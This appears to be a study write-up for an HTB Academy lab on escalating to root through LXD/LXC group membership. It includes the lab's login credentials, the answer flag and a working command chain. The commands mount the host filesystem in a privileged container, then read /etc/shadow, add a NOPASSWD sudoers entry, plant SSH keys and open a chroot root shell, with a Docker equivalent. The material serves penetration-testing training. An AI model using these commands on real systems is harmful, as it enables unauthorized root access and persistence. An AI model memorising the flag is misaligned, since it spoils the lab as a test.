# Section 14 — Containers (LXC / LXD)

> Lab: `ACADEMY-LLPE-CONT` · `ssh htb-student@<T>` (`HTB_@cademy_stdnt!`)
> Deep-dive on the `lxd` vector introduced in §10 (Privileged Groups).

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — flag.txt via container escape | **`HTB{C0nT41n3rs_uhhh}`** |

`htb-student` ∈ **`lxd`** group → privileged container with host `/` mounted → read `/mnt/root/root/flag.txt` as container-root.

---

## Concept

LXD = system-container manager. Membership of the **`lxd`/`lxc`** group is root-equivalent: you can launch a container with `security.privileged=true` (no UID isolation → container-root == host-root) and bind-mount the host filesystem into it, then read/write anything as root.

---

## Step 1 — Confirm group + locate an image

```bash
id | tr ',' '\n' | grep -E 'lxd|lxc'        # must be in lxd/lxc
which lxc lxd; lxc image list </dev/null    # any image already imported?
# find a template/rootfs to import (alpine is tiny & common):
find / \( -name '*.tar.gz' -o -name '*.tar.xz' \) 2>/dev/null | grep -viE '^/usr|^/snap|/lib/'
ls -la ~/ContainerImages 2>/dev/null
```
> Here: `~/ContainerImages/alpine-v3.18-x86_64-20230607_1234.tar.gz`. No image on disk? build one on Kali: `lxc image export <img>`, or use `distrobuilder`, or pull `images:alpine/3.18` if the box has internet.

---

## Step 2 — Import → privileged container → mount host `/`

```bash
lxd init --auto </dev/null 2>/dev/null      # ensure a storage pool/profile exists (snap LXD)
lxc image import ~/ContainerImages/alpine-*.tar.gz --alias alpine </dev/null
lxc init alpine privesc -c security.privileged=true </dev/null
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true </dev/null
lxc start privesc </dev/null
lxc exec privesc -- sh -c 'cat /mnt/root/root/flag.txt; find /mnt/root -maxdepth 3 -name flag.txt -exec cat {} \;' </dev/null
```
> ⚠️ **Gotcha (hit live):** `lxc` reads **stdin** for config; inside a `bash -s`/heredoc it slurps the *next commands* as YAML → `cannot unmarshal !!str ... into api.InstancePut`. **Redirect every `lxc` command with `</dev/null`** when scripting non-interactively. `security.privileged=true` disables UID mapping (container root = host root); `recursive=true` bind-mounts the whole host FS at `/mnt/root`. `lxc exec ... -- cmd` runs as **root** inside → full host read/write.

**Escalation options once `/mnt/root` is mounted:**
```bash
lxc exec privesc -- cat /mnt/root/etc/shadow                 # crack offline
lxc exec privesc -- sh -c 'cat >> /mnt/root/etc/sudoers <<<"htb-student ALL=(ALL) NOPASSWD:ALL"'
lxc exec privesc -- sh -c 'mkdir -p /mnt/root/root/.ssh; cat key.pub >> /mnt/root/root/.ssh/authorized_keys'
lxc exec privesc -- chroot /mnt/root /bin/bash               # full root shell on host FS
```

**Cleanup:**
```bash
lxc stop privesc </dev/null; lxc delete -f privesc </dev/null; lxc image delete alpine </dev/null
```
> Remove your container/image; leave any pre-existing box containers (e.g. a stock `ubuntu`) alone.

---

## Docker equivalent (same group-membership idea)

```bash
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh         # host root
# no image: docker run -v /:/mnt --rm -it $(docker images -q|head -1) chroot /mnt sh
```

---

## Exam / Engagement Notes

- **`id` → `lxd`/`lxc`/`docker` group = instant root.** Don't chase other vectors first.
- LXD chain: import image → `init -c security.privileged=true` → `config device add ... source=/ path=/mnt/root recursive=true` → `start` → `exec`.
- **Scripting LXD over SSH: append `</dev/null` to every `lxc`** or it eats stdin and YAML-errors.
- Snap LXD needs `lxd init --auto` once (storage pool) — silently fails otherwise.
- Loot via `/mnt/root`: read `flag`/`shadow`, write `sudoers`/`authorized_keys`, or `chroot` for a full shell.
- Report note: treat `lxd`/`lxc`/`docker` group as root; never grant to interactive users.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T> ; id  -> groups=...,116(lxd)
2. find / -name '*.tar.gz' -> ~/ContainerImages/alpine-v3.18-...tar.gz
3. lxc image import alpine-*.tar.gz --alias alpine </dev/null
   lxc init alpine privesc -c security.privileged=true </dev/null
   lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true </dev/null
   lxc start privesc </dev/null
4. lxc exec privesc -- cat /mnt/root/root/flag.txt
   -> HTB{C0nT41n3rs_uhhh}    ✅
5. lxc delete -f privesc </dev/null ; lxc image delete alpine </dev/null   # cleanup
```

> One line: `lxd` group → privileged container with host `/` bind-mounted → read/own anything as root (remember `</dev/null` when scripting `lxc`).
